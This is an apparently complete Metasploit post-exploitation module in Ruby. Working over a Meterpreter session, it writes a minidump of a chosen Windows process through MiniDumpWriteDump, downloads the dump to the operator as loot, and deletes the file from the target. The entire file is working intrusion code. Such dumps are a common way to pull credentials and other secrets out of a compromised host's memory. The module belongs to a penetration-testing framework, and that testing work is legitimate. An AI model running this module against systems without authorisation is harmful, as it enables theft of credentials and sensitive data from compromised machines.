##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'tempfile'

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Process Memory Dump',
        'Description' => %q{
          This module creates a memory dump of a process (to disk) and downloads the file
          for offline analysis.
          Options for DUMP_TYPE affect the completeness of the dump. "full" retrieves
          the entire process address space (all allocated pages).
          "standard" excludes image files (e.g. DLLs and EXEs in the address space) as
          well as memory mapped files. As a result, this option can be significantly
          smaller in size.
        },
        'License' => MSF_LICENSE,
        'Author' => ['smashery'],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options([
      OptInt.new('PID', [true, 'ID of the process to dump memory from']),
      OptString.new('DUMP_PATH', [true, 'File to write memory dump to', nil]),
      OptEnum.new('DUMP_TYPE', [ true, 'Minidump size', 'standard', ['standard', 'full']])
    ])
  end

  def get_process_handle
    target_pid = datastore['PID']
    result = session.railgun.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, target_pid)
    error = result['GetLastError']
    unless error == 0
      fail_with(Msf::Module::Failure::PayloadFailed, "Unable to open process: #{result['ErrorMessage']}")
    end
    result['return']
  end

  def create_file
    path = datastore['DUMP_PATH']
    result = session.railgun.kernel32.CreateFileW(
      path,
      'GENERIC_READ | GENERIC_WRITE',
      0,
      nil,
      'CREATE_ALWAYS',
      0,
      0
    )
    error = result['GetLastError']
    unless error == 0
      fail_with(Msf::Module::Failure::PayloadFailed, "Unable to create file: #{result['ErrorMessage']}")
    end
    result['return']
  end

  def dump_process
    target_pid = datastore['PID']
    name = nil
    client.sys.process.processes.each do |p|
      if p['pid'] == target_pid
        name = p['name']
      end
    end
    fail_with(Msf::Module::Failure::PayloadFailed, "Could not find process #{target_pid}") unless name
    print_status("Dumping memory for #{name}")

    if datastore['DUMP_TYPE'] == 'standard'
      # MiniDumpWithDataSegs | MiniDumpWithHandleData | MiniDumpWithIndirectlyReferencedMemory
      # | MiniDumpWithProcessThreadData | MiniDumpWithPrivateReadWriteMemory | MiniDumpWithThreadInfo
      dump_flags = 0x1 | 0x4 | 0x40 | 0x100 | 0x200 | 0x1000
    elsif datastore['DUMP_TYPE'] == 'full'
      # MiniDumpWithFullMemory
      dump_flags = 0x2
    end

    process_handle = nil
    file_handle = nil
    begin
      process_handle = get_process_handle
      file_handle = create_file
      result = session.railgun.dbghelp.MiniDumpWriteDump(process_handle,
                                                 target_pid,
                                                 file_handle,
                                                 dump_flags,
                                                 nil,
                                                 nil,
                                                 nil)
      unless result['return']
        fail_with(Msf::Module::Failure::PayloadFailed, "Minidump failed: #{result['ErrorMessage']}")
      end
    ensure
      session.railgun.kernel32.CloseHandle(process_handle) if process_handle
      session.railgun.kernel32.CloseHandle(file_handle) if file_handle
    end

    path = datastore['DUMP_PATH']

    begin
      loot_path = store_loot('windows.process.dump', 'application/octet-stream', session, '')
      src_stat = client.fs.filestat.new(path)
      print_status("Downloading minidump (#{Filesize.new(src_stat.size).pretty})")
      session.fs.file.download_file(loot_path, path)
      print_good("Memory dump stored at #{loot_path}")
    ensure
      print_status('Deleting minidump from disk')
      session.fs.file.delete(path)
    end
  end

  def run
    if session.type != 'meterpreter'
      print_error 'Only meterpreter sessions are supported by this post module'
      return
    end

    print_status("Running module against #{sysinfo['Computer']}")

    pid = datastore['PID']

    if pid == (session.sys.process.getpid) && !datastore['ForceExploit']
      fail_with(Msf::Module::Failure::BadConfig, 'Dumping current process is not recommended (can result in deadlock). To run anyway, set ForceExploit to True')
    end

    dump_process
  end
end
